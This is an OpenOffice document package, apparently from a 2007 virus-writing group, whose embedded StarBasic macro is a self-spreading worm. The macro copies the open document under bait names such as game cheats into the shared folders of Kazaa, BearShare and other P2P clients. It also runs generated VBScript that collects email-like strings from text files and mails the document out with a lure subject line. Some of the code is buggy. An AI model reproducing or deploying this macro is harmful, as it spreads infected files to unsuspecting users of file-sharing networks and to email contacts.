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estvbs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Necronomikon</meta:initial-creator>
    <meta:creation-date>2006-12-15T13:07:29</meta:creation-date>
    <dc:creator>Necronomikon D00mRiderz</dc:creator>
    <dc:date>2007-02-08T18:06:28</dc:date>
    <dc:language>de-DE</dc:language>
    <meta:editing-cycles>11</meta:editing-cycles>
    <meta:editing-duration>PT3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vbs"/>
</library:library>
</file>

<file path=Basic/Standard/testvbs.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="testvbs" script:language="StarBasic">REM  *****  BASIC  *****

Sub ooo()
rem Ooo.Wangxun by Necronomikon[D00mRiderz]
Dim mEventProps(1) as new com.sun.star.beans.PropertyValue
mEventProps(0).Name = "EventType"
mEventProps(0).Value = "StarBasic"
mEventProps(1).Name = "Script"
mEventProps(1).Value = "macro://ThisComponent/Standard.wangxun.bla"
end sub 
sub bla
Dim dirz As String
Dim dummy()
Dim iVar As Integer
oMailer = createUnoService( "com.sun.star.system.SimpleSystemMail" )
MailProgramm = omailer.querySimpleMailClient()
oleService = createUnoService("com.sun.star.bridge.OleObjectFactory")
WSH=oleService.createInstance("MSScriptControl.ScriptControl")

iVar = Int((15 * Rnd) -2)
Select Case iVar
Case 1 To 3
files= "HalfLife2-Episode2_cheats.odt"
Case 4 To 6
files= "Pet Soccer.odt"
Case 7, 8
files= "Fifa2007_cheats.odt"
Case Is &gt; 8 And iVar &lt; 11
files= "Nexuiz Full v2_1 Installation Guide.odt"
Case Else
files= "how to cook humans.odt"
End Select
datei="c:\temp.odt"
dateiurl=converttourl(datei)
odoc=thisComponent
odoc.storeasurl(dateiurl,dummy())
dirz=Environ ("programfiles")
If dirz = "" Then dirz=Environ("programfiles")
Filecopy "c:\temp.odt" ,"c:\test1.odt"
Filecopy "c:\test1.odt" ,  dirz &amp;"\Kazaa\My Shared Folder\"&amp; files
Filecopy "c:\temp.odt" ,  dirz &amp;"\bearshare\shared\" &amp;files
'Filecopy "c:\temp.odt" ,  dirz &amp;"\eDonkey2000\incoming\" &amp;files".odt"
Filecopy "c:\temp.odt" ,  dirz &amp;"\kazaa lite\my shared folder\" &amp;files
Filecopy "c:\temp.odt" ,  dirz &amp;"\kmd\my shared folder\"&amp; files 
'Filecopy "c:\temp.odt" ,  dirz &amp;"\grokster\my grokster\" &amp;files".odt"
'Filecopy "c:\temp.odt" ,  dirz &amp;"\morpheus\my shared folder\" &amp;files".odt"
'Filecopy "c:\temp.odt" ,  dirz &amp;"\limewire\shared\" &amp;files".odt"
'Filecopy "c:\temp.odt" ,  dirz &amp;"\AppleJuice\Incoming\" &amp;files".odt"
'Filecopy "c:\temp.odt" ,  dirz &amp;"\?shar?\" &amp;files".odt"
'Filecopy "c:\temp.odt" ,  dirz &amp;"\icq\shared files\" &amp;files".odt"

WSH.Language = "VBScript"
vbs=vbs+"Dim Data_, addr"+Chr(10)
vbs=vbs+"Start_dir = ""."""+Chr(10)
vbs=vbs+"set FSO=createobject(""scripting.filesystemobject"")"+Chr(10)
vbs=vbs+"Set Dir = FSO.GetFolder(Start_dir)"+Chr(10)
vbs=vbs+"getInfo(Dir)"+Chr(10)
vbs=vbs+"Function getInfo(CurrentDir)"+Chr(10)
vbs=vbs+"on error resume next"+Chr(10)
vbs=vbs+"For Each Item In CurrentDir.Files"+Chr(10)
vbs=vbs+"Data_ = "" : addr = """+Chr(10)
vbs=vbs+"If LCase(Right(Cstr(Item.Name), 3)) = ""txt"" Then"+Chr(10)
vbs=vbs+"Set open_ = FSO.OpenTextFile(Item.Name, 1)"+Chr(10)
vbs=vbs+"Do While Not open_.AtEndOfLine"+Chr(10)
vbs=vbs+"Data_ = open_.ReadLine "+Chr(10)
vbs=vbs+"addr = Split(Data_, "" "")"+Chr(10)
vbs=vbs+"For mail = 0 To UBound(addr)"+Chr(10)
vbs=vbs+"If InStr(addr(mail), ""@"") then"+Chr(10)
vbs=vbs+"MsgBox Trim(addr(mail))"+Chr(10)
vbs=vbs+"end if"+Chr(10)
vbs=vbs+"next"+Chr(10)
vbs=vbs+"loop"+Chr(10)
vbs=vbs+"End If"+Chr(10)
vbs=vbs+"Next"+Chr(10)
vbs=vbs+"for each Item In CurrentDir.SubFolders"+Chr(10)
vbs=vbs+"getInfo(Item)"+Chr(10)
vbs=vbs+"Next"+Chr(10)
vbs=vbs+"End Function"
WSH.ExecuteStatement(vbs)

newmsg = MailProgramm.createSimpleMailMessage()
newmsg.setRecipient("addr(mail)")
newmsg.setSubject( "check this message commin from me..." )
Dim attachs(0)
attachs(0)="file:///c:/"&amp; files 
newmsg.setAttachement(attachs())
Mailprogramm.sendSimpleMailMessage(newmsg, 0 )
wait 20000
kill "c:\test1.odt"
wait 2000
kill "c:\temp.odt"
oDoc.store()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